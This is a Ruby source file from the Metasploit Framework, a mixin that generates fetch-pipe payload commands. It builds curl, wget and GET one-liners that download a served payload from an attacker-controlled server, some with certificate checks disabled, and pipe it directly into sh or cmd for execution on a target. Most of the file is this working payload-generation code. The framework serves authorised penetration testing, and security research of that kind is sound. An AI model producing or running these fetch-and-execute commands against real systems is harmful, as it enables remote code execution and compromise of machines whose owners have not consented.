module Msf
  ###
  #
  # Common library for pipe-enabled fetch payloads
  #
  ###
  module Payload::Adapter::Fetch::Pipe

    def _download_pipe(uripath)
      "#{srvnetloc}/#{uripath}"
    end

    def pipe_supported_binaries
      # this is going to expand when we add psh support
      return %w[CURL] if windows?

      %w[WGET CURL]
    end

    def generate_pipe_command(uri)
      # TODO: Make a check method that determines if we support a platform/server/command combination

      case datastore['FETCH_COMMAND'].upcase
      when 'WGET'
        return _generate_wget_pipe(uri)
      when 'CURL'
        return _generate_curl_pipe(uri)
      else
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported binary selected for FETCH_PIPE option: #{datastore['FETCH_COMMAND']}, must be one of #{pipe_supported_binaries}.")
      end
    end

    def pipe_srvuri
      return datastore['FETCH_URIPATH'] unless datastore['FETCH_URIPATH'].blank?

      default_srvuri('pipe')
    end

    def _generate_curl_pipe(uri)
      execute_cmd = 'sh'
      execute_cmd = 'cmd' if windows?
      case fetch_protocol
      when 'HTTP'
        return "curl -s http://#{_download_pipe(uri)}|#{execute_cmd}"
      when 'HTTPS'
        return "curl -sk https://#{_download_pipe(uri)}|#{execute_cmd}"
      else
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
      end
    end

    def _generate_wget_pipe(uri)
      case fetch_protocol
      when 'HTTPS'
        return "wget --no-check-certificate -qO- https://#{_download_pipe(uri)}|sh"
      when 'HTTP'
        return "wget -qO- http://#{_download_pipe(uri)}|sh"
      else
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
      end
    end

    # Builds a GET command that streams a served command directly into a shell.
    #
    # @return [String] The GET pipe command.
    def _generate_get_pipe(uri)
      # Specifying the method (-m GET) is necessary on OSX
      execute_cmd = 'sh'
      execute_cmd = 'cmd' if windows?
      case fetch_protocol
      when 'HTTP'
        return "GET -m GET http://#{_download_pipe(uri)}|#{execute_cmd}"
      when 'HTTPS'
        # There is no way to disable cert check in GET ...
        print_error('GET binary does not support insecure mode')
        fail_with(Msf::Module::Failure::BadConfig, 'FETCH_CHECK_CERT must be true when using GET')
        return "GET -m GET https://#{_download_pipe(uri)}|#{execute_cmd}"
      when 'FTP'
        return "GET ftp://#{_download_pipe(uri)}|#{execute_cmd}"
      else
        fail_with(Msf::Module::Failure::BadConfig, "Unsupported protocol: #{fetch_protocol.inspect}")
      end
    end


  end
end